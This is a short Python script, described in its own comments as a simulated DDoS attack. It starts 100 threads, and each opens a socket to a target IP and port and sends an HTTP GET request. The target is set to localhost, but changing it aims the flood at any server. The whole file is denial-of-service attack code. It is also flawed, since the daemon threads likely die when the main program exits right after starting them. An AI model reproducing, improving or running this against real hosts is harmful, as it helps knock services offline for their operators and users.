import socket
import threading

target_ip = '127.0.0.1'  # Localhost for testing
target_port = 80  # HTTP port
threads = 100  # Number of threads to simulate attack

# Function to create socket and send requests to the target
def attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target_ip, target_port))
        client.sendto(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n", (target_ip, target_port))
        print(f"Sending request to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

# Function to create multiple threads to simulate DDoS
def start_attack():
    for i in range(threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.daemon = True  # Daemon threads exit when the main program exits
        thread.start()

# Start the attack
start_attack()

